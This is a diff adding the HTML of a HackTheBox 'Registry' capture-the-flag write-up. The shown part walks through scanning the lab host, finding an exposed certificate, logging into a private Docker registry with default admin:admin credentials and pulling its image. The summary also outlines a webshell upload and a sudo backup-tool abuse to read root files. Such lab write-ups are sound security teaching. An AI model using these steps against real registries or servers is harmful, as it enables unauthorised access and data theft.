@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Registry was my first hard box, this box was pretty interesting with real-life scenario like I love. This box shows the importance of understanding how things works “behind the scene” and to read al">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Registry">
+<meta property="og:url" content="https://hg8.sh/registry/index.html">
+<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
+<meta property="og:description" content="Registry was my first hard box, this box was pretty interesting with real-life scenario like I love. This box shows the importance of understanding how things works “behind the scene” and to read al">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82158642-6e7f4f00-9889-11ea-914c-557127a898c6.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/73365373-756b5d00-42ac-11ea-8134-e63c52f73b34.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/73366783-ced48b80-42ae-11ea-8ad0-3583a3cacacf.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/75478718-ba171080-599e-11ea-8a71-450c96466f93.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/75478994-2134c500-599f-11ea-8b40-09e1489b3d57.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/75479875-8e952580-59a0-11ea-9bb0-54ca89137950.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/75480049-e2077380-59a0-11ea-9eec-d5a3d1555d77.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/75481560-8c809600-59a3-11ea-8b0a-7a2c2c7f88ec.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/75481639-aae69180-59a3-11ea-8154-75163f358616.png">
+<meta property="article:published_time" content="2020-04-03T22:00:00.000Z">
+<meta property="article:modified_time" content="2020-05-18T10:09:35.845Z">
+<meta property="article:author" content="hg8">
+<meta property="article:tag" content="enumeration">
+<meta property="article:tag" content="webshell">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="sudo">
+<meta property="article:tag" content="docker">
+<meta property="article:tag" content="shell_exec">
+<meta property="article:tag" content="registry">
+<meta property="article:tag" content="docker-registry">
+<meta property="article:tag" content="restic">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/82158642-6e7f4f00-9889-11ea-914c-557127a898c6.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+     
+    <title>HackTheBox - Registry :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/traverxec/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/postman/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://hg8.sh/registry/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://hg8.sh/registry/&text=HackTheBox - Registry" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://hg8.sh/registry/&title=HackTheBox - Registry" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hg8.sh/registry/&is_video=false&description=HackTheBox - Registry" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Registry&body=Check out this article: https://hg8.sh/registry/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://hg8.sh/registry/&title=HackTheBox - Registry" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://hg8.sh/registry/&title=HackTheBox - Registry" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://hg8.sh/registry/&title=HackTheBox - Registry" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://hg8.sh/registry/&title=HackTheBox - Registry" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://hg8.sh/registry/&name=HackTheBox - Registry&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://hg8.sh/registry/&t=HackTheBox - Registry" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">2.</span> <span class="toc-text">Recon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-Registry"><span class="toc-number">2.1.</span> <span class="toc-text">Docker Registry</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">3.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">3.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-bolt-gt-www-data"><span class="toc-number">3.2.</span> <span class="toc-text">Pivot bolt -&gt; www-data</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Restic-privileged-file-read"><span class="toc-number">3.3.</span> <span class="toc-text">Restic privileged file read</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        <header id="header">
+  <a href="/">
+  
+      <div id="logo" style="background-image: url(/images/logo.png);"></div>
+  
+    <span class="logo__mark"></span>
+    <span class="logo__text">./hg8.sh</span>
+    <span class="logo__cursor"></span>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
+      </li>
+       
+        <li><a href="/">Home</a></li>
+       
+        <li><a href="/about/">About</a></li>
+       
+        <li><a href="/archives/">Posts</a></li>
+       
+        <li><a href="/search/">Search</a></li>
+       
+        <li><a href="/tags/">Tags</a></li>
+      
+    </ul>
+  </div>
+</header>
+
+        
+          <br>
+          <br>
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HackTheBox - Registry
+    </h1>
+
+
+
+    <div class="meta"> 
+      
+    <div class="postdate">
+      
+        <time datetime="2020-04-03T22:00:00.000Z" itemprop="datePublished">04-04-2020</time>
+        
+      
+    </div>
+
+
+      — Written by 
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hg8</span>
+      </span>
+      —
+      20 min read
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <img width="586" alt="registry-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158642-6e7f4f00-9889-11ea-914c-557127a898c6.png">
+
+<p>Registry was my first hard box, this box was pretty interesting with real-life scenario like I love. This box shows the importance of understanding how things works “behind the scene” and to read all documentations carefully to not miss anything. I recommend this box for people  who finished few medium difficulty boxes and wants to level-up.</p>
+<p><strong>Tl;Dr:</strong> The user flag consisted in finding an <code>INSTALL</code> archive containing install instruction and certificate to deploy an online docker registry, this certificate was used on the docker registry running on the box. Using this cert we could connect to the registry API and pull the docker image available on it. Running the docker image locally and doing recon into it allows to find an SSH key along with its passphrase. This key would allow to connect to the <code>bolt</code> user account and grab the user flag.<br>The root flag required to access a CMS after brute-forcing the admin password found in a sqlite database. From the CMS we pivot from the <code>bolt</code> user to <code>www-data</code> user by exploiting insecure file upload vulnerability. From <code>www-data</code> a backup software - restic - can be run as sudo without password. Using this software we are able to backup the whole <code>/root/</code> folder and restore its content with read privileges for <code>www-data</code> including the <code>root.txt</code> flag and a <code>.ssh/id_rsa</code> key allowing us to get a full shell as root.   </p>
+<p>Alright! Let’s get into the details now!</p>
+<hr>
+<p>First thing first, let’s add the box IP to the host file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.171 registry.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>and let’s start!</p>
+<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC registry.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-27 10:58 CET</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp  open  http     nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Welcome to nginx!</span><br><span class="line">443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Welcome to nginx!</span><br><span class="line">| ssl-cert: Subject: commonName=docker.registry.htb</span><br><span class="line">| Not valid before: 2019-05-06T21:14:35</span><br><span class="line">|_Not valid after:  2029-05-03T21:14:35</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>Port <code>80</code>, <code>443</code> and <code>22</code> are open. </p>
+<p>One interesting point, the SSL certificate have <code>docker.registry.htb</code> as <code>common Name</code>. Let’s add it to our host file as it can be useful later:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.159 docker.registry.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>Opening <code>http://regirstry.htb</code> display the default nginx page:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/73365373-756b5d00-42ac-11ea-8134-e63c52f73b34.png" alt="default nginx page"></p>
+<p>While <code>http://docker.registry.htb</code> return empty response:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl -i http://docker.registry.htb/</span><br><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: nginx/1.14.0 (Ubuntu)</span><br><span class="line"><span class="attribute">Content-Length</span>: 0</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">Strict-Transport-Security</span>: max-age=63072000; includeSubdomains</span><br><span class="line"><span class="attribute">X-Frame-Options</span>: DENY</span><br><span class="line"><span class="attribute">X-Content-Type-Options</span>: nosniff</span><br></pre></td></tr></table></figure>
+
+<p>That’s not much informations here… Let’s run <code>gobuster</code> to see if we can find more interesting stuff:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">"https://registry.htb/"</span> -w ~/SecLists/Discovery/Web-Content/big.txt -x php -k </span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/.bash_history (Status: 403)</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/install (Status: 301)</span><br><span class="line">/backup.php</span><br><span class="line">===============================================================</span><br><span class="line">2020/01/29 15:43:58 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
+
+<p>The backup endpoint must be used as a script to do…well…backups.  It doesn’t return anything either:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl -i registry.htb/backup.php                            </span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.14.0 (Ubuntu)</span><br><span class="line">Date: Fri, 07 Feb 2020 14:33:30 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Strict-Transport-Security: max-age=63072000; includeSubdomains</span><br><span class="line">X-Frame-Options: DENY</span><br><span class="line">X-Content-Type-Options: nosniff</span><br></pre></td></tr></table></figure>
+
+<p>Next, opening the <code>install</code> endpoint shows some garbage:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/73366783-ced48b80-42ae-11ea-8ad0-3583a3cacacf.png" alt="install file garbage"></p>
+<p>Since we don’t have other endpoint so far let’s investigate a bit more on this last one. First let’s download this page to file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget http://registry.htb/install</span><br><span class="line">Saving to: ‘install’</span><br><span class="line">2020-01-29 15:54:07 (53.3 MB/s) - ‘install’ saved [1050]</span><br><span class="line">[hg8@archbook ~]$ file install</span><br><span class="line">install: gzip compressed data, last modified: Mon Jul 29 23:38:20 2019, from Unix, original size modulo 2^32 167772200 gzip compressed data, reserved method, has CRC, was <span class="string">""</span>, from FAT filesystem (MS-DOS, OS/2, NT), original size modulo 2^32 167772200</span><br></pre></td></tr></table></figure>
+
+<p>That’s interesting, the <code>file</code> utility indicate that the <code>install</code> file is a <code>gzip</code> archive. Let’s try to extract it. Out of habit I used <code>tar</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ tar -xzf install</span><br><span class="line"></span><br><span class="line">gzip: stdin: unexpected end of file</span><br><span class="line">tar: Child returned status 1</span><br><span class="line">tar: Error is not recoverable: exiting now</span><br></pre></td></tr></table></figure>
+
+<p>Despite this bad looking error the files seems to have been extracted properly so that’s good:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ls -a</span><br><span class="line">.  ..  ca.crt  install  readme.md</span><br></pre></td></tr></table></figure>
+
+<p><em>Note: Another way to access archive content when the archive seems corrupted it to use <code>zcat</code>:</em></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ zcat install</span><br><span class="line">ca.crt0000775000004100000410000000210613464123607012215 0ustar  www-datawww-data-----BEGIN CERTIFICATE-----</span><br><span class="line">MIIC/DCCAeSgAwIBAgIJAIFtFmFVTwEtMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV</span><br><span class="line">[...]</span><br><span class="line">QMPjq1S5SqXJqzop4OnthgWlwggSe/6z8ZTuDjdNIpx0tF77arh2rUOIXKIerx5B</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line">readme.md0000775000004100000410000000020113472260460012667 0ustar  www-datawww-data<span class="comment"># Private Docker Registry</span></span><br><span class="line"></span><br><span class="line">- https://docs.docker.com/registry/deploying/</span><br><span class="line">- https://docs.docker.com/engine/security/certificates/</span><br><span class="line"></span><br><span class="line">gzip: install: unexpected end of file</span><br></pre></td></tr></table></figure>
+
+<p>So we got two files unzipped, a certificate <code>ca.crt</code> and a readme file <code>readme.md</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat ca.crt</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIIC/DCCAeSgAwIBAgIJAIFtFmFVTwEtMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV</span><br><span class="line">[...]</span><br><span class="line">QMPjq1S5SqXJqzop4OnthgWlwggSe/6z8ZTuDjdNIpx0tF77arh2rUOIXKIerx5B</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line">[hg8@archbook ~]$ cat readme.md</span><br><span class="line"><span class="comment"># Private Docker Registry</span></span><br><span class="line"></span><br><span class="line">- https://docs.docker.com/registry/deploying/</span><br><span class="line">- https://docs.docker.com/engine/security/certificates/</span><br></pre></td></tr></table></figure>
+
+<p>The readme links to two pieces of documentation:</p>
+<ol>
+<li><p>Deployment of a private docker registry.</p>
+</li>
+<li><p>Verifying repository client with certificates</p>
+</li>
+</ol>
+<p>These documentation make sense of what we found so far, <code>docker.registry.htb</code> is probably the API of a private docker registry, while the <code>ca.crt</code> might be used to connect to the registry securely. </p>
+<h3 id="Docker-Registry"><a href="#Docker-Registry" class="headerlink" title="Docker Registry"></a>Docker Registry</h3><p>Now that we have an idea of what’s going on <code>docker.registry.htb</code> let’s make a bit of recon to see what we can do with this instance. First let’s run <code>gobuster</code> to see if we can find useful endpoints:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">"https://docker.registry.htb/"</span> -w ~/SecLists/Discovery/Web-Content/big.txt -x php -k</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/v2 (Status: 301)</span><br><span class="line">===============================================================</span><br><span class="line">2020/01/27 11:11:10 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
+
+<p>This <code>/v2</code>  endpoint confirms we are looking at an API. Let’s continue:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl -i docker.registry.htb/v2/</span><br><span class="line">HTTP/1.1 401 Unauthorized</span><br><span class="line">Server: nginx/1.14.0 (Ubuntu)</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Content-Length: 87</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Docker-Distribution-Api-Version: registry/2.0</span><br><span class="line">Www-Authenticate: Basic realm=<span class="string">"Registry"</span></span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">"errors"</span>:[&#123;<span class="string">"code"</span>:<span class="string">"UNAUTHORIZED"</span>,<span class="string">"message"</span>:<span class="string">"authentication required"</span>,<span class="string">"detail"</span>:null&#125;]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Searching for this error redirect us to the valuable <a href="https://docs.docker.com/registry/spec/api/" target="_blank" rel="noopener">Docker Registry API documentation</a> which will probably be super useful soon: </p>
+<blockquote>
+<p>If a <code>401 Unauthorized</code> response is returned, the client should take action based on the contents of the “WWW-Authenticate” header and try the endpoint again. Depending on access control setup, the client may still have to authenticate against different resources, even if this check succeeds.</p>
+</blockquote>
+<p><code>Www-Authenticate</code> that got returned to us indicate we have to authenticate through a <code>Basic</code> authentication method. We didn’t find any username or password yet so… let’s try the classic <code>admin:admin</code>?</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl -i -u admin:admin docker.registry.htb/v2/</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.14.0 (Ubuntu)</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Content-Length: 2</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Docker-Distribution-Api-Version: registry/2.0</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">Strict-Transport-Security: max-age=63072000; includeSubdomains</span><br><span class="line">X-Frame-Options: DENY</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line"></span><br><span class="line">&#123;&#125;%</span><br></pre></td></tr></table></figure>
+
+<p>Alright! We have access to the Docker API Registry, the next logical step is to see if any docker image is stored on this registry. According to the documentation we can do so using the <code>_catalog</code> endpoint:</p>
+<blockquote>
+<p>Images are stored in collections, known as a <em>repository</em>, which is keyed by a <code>name</code>, as seen throughout the API specification. A registry instance may<br>contain several repositories. The list of available repositories is made<br>available through the <em>catalog</em>.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl -u admin:admin http://docker.registry.htb/v2/_catalog</span><br><span class="line">&#123;<span class="string">"repositories"</span>:[<span class="string">"bolt-image"</span>]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Great there is indeed an image, let’s pull it to investigate its content:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ docker pull docker.registry.htb/bolt-image</span><br><span class="line">Using default tag: latest</span><br><span class="line">Error response from daemon: Get https://docker.registry.htb/v2/: x509: certificate signed by unknown authority</span><br></pre></td></tr></table></figure>
+
+<p>New error, certificate error…</p>
+<p>Remember we found a documentation link and a certificate in the <code>install</code> archive? Let’s take a look, the solution is surely inside:</p>
+<blockquote>
+<p>A custom certificate is configured by creating a directory under <code>/etc/docker/certs.d</code> using the same name as the registry’s hostname, such as <code>localhost</code>. All <code>*.crt</code> files are added to this directory as CA roots.</p>
+</blockquote>
+<p>Let’s do this with the certificate we got in <code>install</code> archive:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo mkdir -p /etc/docker/certs.d/docker.registry.htb</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ sudo mv ca.crt /etc/docker/certs.d/docker.registry.htb/ca.crt</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ docker pull docker.registry.htb/bolt-image</span><br><span class="line">Using default tag: latest</span><br><span class="line">Error response from daemon: Get https://docker.registry.htb/v2/bolt-image/manifests/latest: no basic auth credentials</span><br></pre></td></tr></table></figure>
+
+<p>We are getting closer! Let’s login to the docker using the <code>admin:admin</code> credentials:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ docker login -u admin -p admin http://docker.registry.htb</span><br><span class="line">WARNING! Using --password via the CLI is insecure. Use --password-stdin.</span><br><span class="line">WARNING! Your password will be stored unencrypted <span class="keyword">in</span> /home/hg8/.docker/config.json.</span><br><span class="line">Configure a credential helper to remove this warning. See</span><br><span class="line">https://docs.docker.com/engine/reference/commandline/login/<span class="comment">#credentials-store</span></span><br><span class="line"></span><br><span class="line">Login Succeeded</span><br></pre></td></tr></table></figure>
+
+<p>Everything should now be in order, let’s pull this damn image:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ docker pull docker.registry.htb/bolt-image</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from bolt-image</span><br><span class="line">f476d66f5408: Pull complete</span><br><span class="line">302bfcb3f10c: Pull complete</span><br><span class="line">Digest: sha256:eeff225e5fae33dc832c3f82fd8b0db363a73eac4f0f0cb587094be54050539b</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> docker.registry.htb/bolt-image:latest</span><br><span class="line">docker.registry.htb/bolt-image:latest</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ docker images</span><br><span class="line">REPOSITORY                       TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">docker.registry.htb/bolt-image   latest              601499e98a60        8 months ago        362MB</span><br></pre></td></tr></table></figure>
+
